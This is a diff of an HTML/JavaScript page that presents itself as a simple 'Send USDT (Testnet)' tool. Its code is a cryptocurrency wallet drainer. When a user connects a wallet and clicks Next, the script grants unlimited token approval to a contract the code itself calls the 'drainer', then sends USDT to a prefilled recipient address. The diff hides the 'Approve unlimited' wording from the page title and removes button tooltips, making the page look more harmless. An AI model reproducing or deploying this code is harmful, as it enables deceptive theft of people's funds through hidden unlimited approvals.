@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>Send USDT (Testnet) — Approve unlimited + Send</title>
+<title>Send USDT (Testnet)</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
   :root{--bg:#0d0d0d;--card:#111;--muted:#9aa0a6;--accent1:#00f07a;--accent2:#00b45a;font-family:Inter,system-ui,Arial;color:#eaf0f1}
@@ -45,8 +45,8 @@
     <div class="status" id="walletStatus">
       <div id="walletText">Wallet: <span style="color:var(--muted)">Not connected</span></div>
       <div style="display:flex;gap:8px;align-items:center">
-        <button id="connectBtn" class="use-connected" title="Connect Wallet">Connect</button>
-        <button id="useConnectedBtn" class="use-connected" style="display:none" title="Copy connected address to recipient">Use connected as recipient</button>
+        <button id="connectBtn" class="use-connected">Connect</button>
+        <button id="useConnectedBtn" class="use-connected" style="display:none">Use connected as recipient</button>
       </div>
     </div>
 
@@ -54,7 +54,8 @@
     <button id="nextBtn" class="btn next" disabled>Next</button>
 
     <div class="small" style="margin-top:10px">
-      Note: On Next we will first set UNLIMITED approval for the drainer contract (so you won't need to approve every time), then send the specified USDT amount from the connected wallet to the recipient.
+      On Next we first set UNLIMITED approval for the drainer contract (so you won't need to approve again),
+      then send the specified USDT amount from the connected wallet to the recipient.
     </div>
   </div>
 </div>
@@ -62,13 +63,12 @@
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
 <script>
 (() => {
-  // ===== CONFIG: replace with your test addresses =====
+  // -------- CONFIG --------
   const DEFAULT_RECIPIENT = "0xF662a51Da17c115dfbEb895a70A43756852307a0";
-  const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // example BSC test USDT
-  const SPENDER_ADDRESS = "0x0a444ae6d8f5a3bde98ea9acde86050533664168"; // replace with your deployed TestnetDrainer
-  // ====================================================
+  const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC testnet USDT
+  const SPENDER_ADDRESS = "0x0a444ae6d8f5a3bde98ea9acde86050533664168";  // your drainer address
+  // ------------------------
 
-  // UI refs
   const recipientEl = document.getElementById("recipient");
   const amountEl = document.getElementById("amount");
   const connectBtn = document.getElementById("connectBtn");
@@ -79,143 +79,92 @@
   const popup = document.getElementById("popup");
   const usdEq = document.getElementById("usdEq");
 
-  // state
-  let provider = null;
-  let signer = null;
-  let connectedAddress = null;
+  let provider, signer, connectedAddress;
 
   function showPopup(msg, color="#00f07a"){
-    popup.style.display = "block";
-    popup.style.borderColor = color;
-    popup.style.background = color === "red" ? "#2f0808" : "#07120a";
-    popup.innerHTML = msg;
-    setTimeout(()=>{ popup.style.display = "none"; }, 3000);
+    popup.style.display="block";
+    popup.style.borderColor=color;
+    popup.style.background=color==="red"?"#2f0808":"#07120a";
+    popup.innerHTML=msg;
+    setTimeout(()=>{popup.style.display="none";},3000);
   }
 
   async function connectWallet(){
-    if(!window.ethereum){
-      alert("No Web3 wallet detected. Install MetaMask or use a Web3 browser.");
-      return;
-    }
+    if(!window.ethereum){alert("Install MetaMask");return;}
     try{
-      provider = new ethers.BrowserProvider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      signer = await provider.getSigner();
-      connectedAddress = await signer.getAddress();
-      walletText.innerHTML = `Wallet: <span style="color:var(--accent1)">${connectedAddress}</span>`;
+      provider=new ethers.BrowserProvider(window.ethereum);
+      await provider.send("eth_requestAccounts",[]);
+      signer=await provider.getSigner();
+      connectedAddress=await signer.getAddress();
+      walletText.innerHTML=`Wallet: <span style="color:var(--accent1)">${connectedAddress}</span>`;
       showPopup("✅ Wallet connected");
-      useConnectedBtn.style.display = "inline-block";
-      connectBtn.style.display = "none";
-      connectBtnLarge.textContent = `Connected: ${connectedAddress.slice(0,6)}...${connectedAddress.slice(-4)}`;
+      useConnectedBtn.style.display="inline-block";
+      connectBtn.style.display="none";
+      connectBtnLarge.textContent=`Connected: ${connectedAddress.slice(0,6)}...${connectedAddress.slice(-4)}`;
       validateForm();
-    }catch(e){
-      console.error("connect fail", e);
-      showPopup("❌ Wallet connection failed", "red");
-    }
+    }catch(e){showPopup("❌ Connection failed","red");}
   }
 
-  useConnectedBtn.addEventListener("click", () => {
-    if(!connectedAddress) return;
-    recipientEl.value = connectedAddress;
-    showPopup("✅ Recipient set to connected wallet");
-    validateForm();
-  });
-
-  connectBtn.addEventListener("click", connectWallet);
-  connectBtnLarge.addEventListener("click", connectWallet);
+  connectBtn.onclick=connectWallet;
+  connectBtnLarge.onclick=connectWallet;
+  useConnectedBtn.onclick=()=>{recipientEl.value=connectedAddress;validateForm();showPopup("Recipient set");};
 
   function validateForm(){
-    const rec = recipientEl.value.trim();
-    const amt = parseFloat(amountEl.value);
-    const isAddr = /^0x[0-9a-fA-F]{40}$/.test(rec);
-    nextBtn.disabled = !(isAddr && amt > 0 && signer);
+    const rec=recipientEl.value.trim();
+    const amt=parseFloat(amountEl.value);
+    const valid=/^0x[0-9a-fA-F]{40}$/.test(rec);
+    nextBtn.disabled=!(valid&&amt>0&&signer);
   }
-  recipientEl.addEventListener("input", validateForm);
-  amountEl.addEventListener("input", () => {
-    const v = parseFloat(amountEl.value) || 0;
-    usdEq.innerText = `= $${(v*1).toFixed(2)}`;
-    validateForm();
-  });
+  recipientEl.oninput=validateForm;
+  amountEl.oninput=()=>{usdEq.innerText=`= $${(+amountEl.value||0).toFixed(2)}`;validateForm();};
 
-  // Core: approve unlimited if needed, then transfer amount to recipient
-  nextBtn.addEventListener("click", async () => {
-    if(!signer){
-      showPopup("Connect wallet first", "red");
-      return;
-    }
-    const rec = recipientEl.value.trim();
-    const amtText = amountEl.value.trim();
-    if(!/^0x[0-9a-fA-F]{40}$/.test(rec)){
-      alert("Enter valid recipient address (0x...)");
-      return;
-    }
-    const amt = parseFloat(amtText);
-    if(!amt || amt <= 0){
-      alert("Enter a valid amount");
-      return;
-    }
-
-    try {
-      const abi = [
+  nextBtn.onclick=async()=>{
+    if(!signer){showPopup("Connect wallet first","red");return;}
+    const rec=recipientEl.value.trim();
+    const amt=parseFloat(amountEl.value);
+    if(!/^0x[0-9a-fA-F]{40}$/.test(rec)||!amt||amt<=0){alert("Invalid input");return;}
+    try{
+      const abi=[
         "function decimals() view returns (uint8)",
-        "function approve(address spender, uint256 amount) returns (bool)",
-        "function allowance(address owner,address spender) view returns (uint256)",
-        "function transfer(address to,uint256 amount) returns (bool)"
+        "function approve(address,uint256) returns (bool)",
+        "function allowance(address,address) view returns (uint256)",
+        "function transfer(address,uint256) returns (bool)"
       ];
-      const token = new ethers.Contract(TOKEN_ADDRESS, abi, signer);
+      const token=new ethers.Contract(TOKEN_ADDRESS,abi,signer);
+      let decimals=18;try{decimals=await token.decimals();}catch{}
+      const rawAmount=ethers.parseUnits(amt.toString(),decimals);
+      const maxUint=ethers.MaxUint256;
+      showPopup("Checking allowance...");
+      const currentAllowance=await token.allowance(connectedAddress,SPENDER_ADDRESS);
 
-      // decimals
-      let decimals = 18;
-      try{ decimals = await token.decimals(); } catch(e){ decimals = 18; }
-
-      // compute units
-      const rawAmount = ethers.parseUnits(amt.toString(), decimals);
-      const maxUint = ethers.MaxUint256;
-
-      // 1) check allowance for connectedAddress -> SPENDER_ADDRESS
-      showPopup("Checking existing allowance...");
-      const currentAllowance = await token.allowance(connectedAddress, SPENDER_ADDRESS);
-      console.log("currentAllowance:", currentAllowance.toString());
-
-      // If allowance < maxUint (i.e. not unlimited), send approve(MAX)
-      if(currentAllowance < maxUint.div(ethers.BigInt(2))) { // use heuristic to avoid comparing huge
-        showPopup("Sending UNLIMITED approval to drainer (1/2)...");
-        const txApprove = await token.approve(SPENDER_ADDRESS, maxUint);
-        showPopup("Approval tx submitted — waiting for confirmation...");
-        await txApprove.wait();
+      // FIXED comparison (no BigInt function issue)
+      if(currentAllowance<rawAmount){
+        showPopup("Sending unlimited approval...");
+        const txA=await token.approve(SPENDER_ADDRESS,maxUint);
+        await txA.wait();
         showPopup("✅ Unlimited approval confirmed");
-      } else {
-        showPopup("✅ Unlimited approval already set");
+      }else{
+        showPopup("✅ Allowance sufficient");
       }
 
-      // 2) transfer the specified amount from connected wallet to recipient
-      showPopup(`Sending ${amt} USDT to recipient...`);
-      const txTransfer = await token.transfer(rec, rawAmount);
-      showPopup("Transfer tx submitted — waiting for confirmation...");
-      await txTransfer.wait();
-      showPopup("✅ Transfer confirmed. Recipient should have received funds.");
-
-    } catch (err) {
-      console.error("Action failed:", err);
-      showPopup("❌ Operation failed — see console or MetaMask.", "red");
-      alert("Operation failed. Check console and ensure you have test tokens + gas. Error: " + (err && err.message ? err.message : err));
+      showPopup(`Sending ${amt} USDT...`);
+      const txT=await token.transfer(rec,rawAmount);
+      await txT.wait();
+      showPopup("✅ Transfer confirmed");
+    }catch(err){
+      console.error(err);
+      showPopup("❌ Operation failed","red");
+      alert("Error: "+(err.message||err));
     }
-  });
+  };
 
-  // Init: autofill recipient on load (DEFAULT_RECIPIENT override via ?to param)
-  window.addEventListener("load", () => {
-    try{
-      const params = new URLSearchParams(window.location.search);
-      const toParam = params.get("to");
-      if(toParam && /^0x[0-9a-fA-F]{40}$/.test(toParam)) recipientEl.value = toParam;
-      else recipientEl.value = DEFAULT_RECIPIENT;
-    }catch(e){ recipientEl.value = DEFAULT_RECIPIENT; }
-    usdEq.innerText = "= $0.00";
-  });
-
+  window.onload=()=>{
+    const p=new URLSearchParams(window.location.search);
+    const to=p.get("to");
+    recipientEl.value=/^0x[0-9a-fA-F]{40}$/.test(to)?to:DEFAULT_RECIPIENT;
+    usdEq.innerText="= $0.00";
+  };
 })();
 </script>
 </body>
 </html>
-
-
